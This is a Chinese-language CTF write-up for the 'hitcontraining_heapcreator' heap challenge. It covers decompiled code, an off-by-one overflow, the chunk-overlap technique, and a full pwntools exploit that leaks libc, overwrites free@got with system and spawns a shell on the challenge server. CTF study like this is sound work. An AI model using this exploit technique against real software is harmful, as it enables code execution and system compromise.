# hitcontraining_heapcreator

[题目地址](https://buuoj.cn/challenges#hitcontraining_heapcreator)

看到堆就呼吸困难=(

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

一看就知道要改got表。程序内部也很清晰，出题人真的尽力让题目简单了，抵不过我还是菜。

```c

void main(void)

{
  int choice;
  long in_FS_OFFSET;
  char local_18 [8];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  do {
    menu();
    read(0,local_18,4);
    choice = atoi(local_18);
    switch(choice) {
    default:
      puts("Invalid Choice");
      break;
    case 1:
      create_heap();
      break;
    case 2:
      edit_heap();
      break;
    case 3:
      show_heap();
      break;
    case 4:
      delete_heap();
      break;
    case 5:
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
}
```

首要任务肯定是去create_heap里看看这道题的堆结构。

```c

void create_heap(void)

{
  long lVar1;
  int iVar2;
  void *pvVar3;
  size_t __size;
  long in_FS_OFFSET;
  int index;
  char local_28 [8];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  index = 0;
  do {
    if (9 < index) {
code_r0x00400a59:
      if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    if (*(long *)(heaparray + (long)index * 8) == 0) {
      pvVar3 = malloc(0x10);   //存储heapraary中的heap的结构堆块大小固定为0x10
      *(void **)(heaparray + (long)index * 8) = pvVar3;   //结构堆块在heaparray上排列
      if (*(long *)(heaparray + (long)index * 8) == 0) {
        puts("Allocate Error");
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      printf("Size of Heap : ");
      read(0,local_28,8);
      iVar2 = atoi(local_28);
      __size = (size_t)iVar2;
      lVar1 = *(long *)(heaparray + (long)index * 8);  //取出刚刚的结构堆块
      pvVar3 = malloc(__size); //malloc一个用户输入size大小的堆块装输入
      *(void **)(lVar1 + 8) = pvVar3;   //在结构堆块指向的地方+8放上内容堆块
      if (*(long *)(*(long *)(heaparray + (long)index * 8) + 8) == 0) {
        puts("Allocate Error");
                    /* WARNING: Subroutine does not return */
        exit(2);
      }
      **(size_t **)(heaparray + (long)index * 8) = __size;    //在结构堆块指向的地方放上size
      printf("Content of heap:");
      read_input(*(undefined8 *)(*(long *)(heaparray + (long)index * 8) + 8),__size);
      puts("SuccessFul");
      goto code_r0x00400a59;
    }
    index = index + 1;
  } while( true );
}
```

做堆题就是很多指针看着头疼，其实看得差不多的时候去调试一下就很清楚了。申请一个size为8，内容为`aaaa+回车`的堆块后，heaparray的结构如下：

```
(gdb) x/16x 0x006020a0
0x6020a0 <heaparray>:   0x00000000015712a0      0x0000000000000000          heaparray里装一个堆块指针
0x6020b0 <heaparray+16>:        0x0000000000000000      0x0000000000000000
0x6020c0 <heaparray+32>:        0x0000000000000000      0x0000000000000000
0x6020d0 <heaparray+48>:        0x0000000000000000      0x0000000000000000
0x6020e0 <heaparray+64>:        0x0000000000000000      0x0000000000000000
0x6020f0:       0x0000000000000000      0x0000000000000000
0x602100:       0x0000000000000000      0x0000000000000000
0x602110:       0x0000000000000000      0x0000000000000000
(gdb) x/16x *0x006020a0
0x15712a0:      0x0000000000000008      0x00000000015712c0    堆块指针的内容是大小和另一个堆块指针
0x15712b0:      0x0000000000000000      0x0000000000000021
0x15712c0:      0x0000000a61616161      0x0000000000000000    这个堆块指针才是内容
0x15712d0:      0x0000000000000000      0x0000000000020d31
0x15712e0:      0x0000000000000000      0x0000000000000000
0x15712f0:      0x0000000000000000      0x0000000000000000
0x1571300:      0x0000000000000000      0x0000000000000000
0x1571310:      0x0000000000000000      0x0000000000000000
```

edit中有一个说明显也不是很明显的off-by-one漏洞。

```c

void edit_heap(void)

{
  int index;
  long in_FS_OFFSET;
  char local_18 [8];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Index :");
  read(0,local_18,4);
  index = atoi(local_18);
  if ((index < 0) || (9 < index)) {
    puts("Out of bound!");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  if (*(long *)(heaparray + (long)index * 8) == 0) {
    puts("No such heap !");
  }
  else {
    printf("Content of heap : ");
    read_input(*(undefined8 *)(*(long *)(heaparray + (long)index * 8) + 8),
               **(long **)(heaparray + (long)index * 8) + 1);    //唯一有问题的就是这里，(heaparray + (long)index * 8)取出之前存起来的size，后面的+1是多余的，这一个字节会溢出
    puts("Done !");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

之前把+1看成在取`(heaparray + (long)index * 8)`的指针里了，导致看不懂它在干啥。free感觉有个uaf，实际上看[wp](https://blog.csdn.net/mcmuyanga/article/details/112387963)后可能是没有。

```c

void delete_heap(void)

{
  int index;
  long in_FS_OFFSET;
  char local_18 [8];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Index :");
  read(0,local_18,4);
  index = atoi(local_18);
  if ((index < 0) || (9 < index)) {
    puts("Out of bound!");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  if (*(long *)(heaparray + (long)index * 8) == 0) {
    puts("No such heap !");
  }
  else {
    free(*(void **)(*(long *)(heaparray + (long)index * 8) + 8));   //先free内容堆块指针
    free(*(void **)(heaparray + (long)index * 8)); //再free heaparray里的堆块指针
    *(undefined8 *)(heaparray + (long)index * 8) = 0;
    puts("Done !");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

这题ctf wiki就有，属于[Chunk Extend and Overlapping](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chChunk%20Extend%20and%20Overlapping%C2%B6)。本来看上面的wp感觉懂了，但是ctf wiki给出的exp又让我看不懂了。

```python
from pwn import *

r = remote("node4.buuoj.cn",29370)


def create(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit(idx, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(content)


def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


def delete(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


free_got = 0x602018
create(0x18, "dada")  # 0
create(0x10, "ddaa")  # 1
# 覆盖heap1的size域为0x41
edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")
# trigger heap 1's struct to fastbin 0x40，现在heap1（heaparray存着的那个指针）指向的堆块在fastbin中是0x40大小
# heap 1's content to fastbin 0x20，可能是我们申请的16字节+16字节chunk头=总共32字节content大小？
delete(1)
# new heap 1's struct will point to old heap 1's content, size 0x20，更不懂了，哪来的old heap1？不是已经free掉了吗？
# new heap 1's content will point to old heap 1's struct, size 0x30，看起来是接下来create的0x30大小被写入了原heap1在heaparray上存着的那个指针
# that is to say we can overwrite new heap 1's struct
# here we overwrite its heap content pointer to free@got
create(0x30, p64(0) * 4 + p64(0x30) + p64(0x00602018))  #1
# leak freeaddr
show(1)
r.recvuntil("Content : ")
data = r.recvuntil("Done !")

free_addr = u64(data.split(b"\n")[0].ljust(8, b"\x00"))
libc_base = free_addr - 541936
log.success('libc base addr: ' + hex(libc_base))
system_addr = libc_base + 283536
#gdb.attach(r)
# overwrite free@got with system addr
edit(1, p64(system_addr))
# trigger system("/bin/sh")
delete(0)
r.interactive()
```

这个exp我看不懂的地方在于只用了2个堆就getshell，而看的wp用了3个堆，非常好理解,就是申请3个堆，编辑0号堆溢出到1号堆的size并更改，于是free时就会把还在使用中的chunk3吞并。接着create就能编辑chunk3的指针，从而泄露地址和改system。但是这里怎么只用了2个啊？

在我懵逼了一个小时后，我又搜到了一篇[wp](https://blog.csdn.net/qq_53928256/article/details/126463515)。关键点在于，申请大小为0x18时不代表实际得到的堆块整体大小就是0x18，还有chunk_header，还有下一个chunk的pre_size域利用，要根据这个特点让我们溢出的一个字节正好到下一个堆块的size域而不是pre_size域。还有一个点，就是程序内free是free了两个堆块的，heaparray中的结构指针和内容指针。我们通过chunk覆盖导致两个指针指向的空间有重叠，所以在新建堆块时，heaparray的结构指针申请到内容指针可以控制到的地方去了。大概是这么一个情况：

1. 原本的heaparray堆块在1-20，内容堆块在21-38，一切安好（没有遵循系统分配heap的规律，举个例子而已）
2. 现在伪造heaparray堆块的大小，导致系统认为heaparray堆块在1-40，内容堆块不变，还在21-38。现在两者重叠。
3. free后申请一个新堆块，大小等于刚刚伪造的heaparray堆块的大小。由于内容堆块的大小符合heaparray堆块需要的大小，刚才的内容堆块就变成了heaparray堆块；反之刚才的heaparray堆块就变成了内容堆块，也就是给的exp中提到的old heap1和new heap1。
4. 两者重叠，现在的heaparray堆块被现在的内容堆块覆盖。因此编辑内容堆块就能更改heaparray堆块。由此泄露地址，更改system。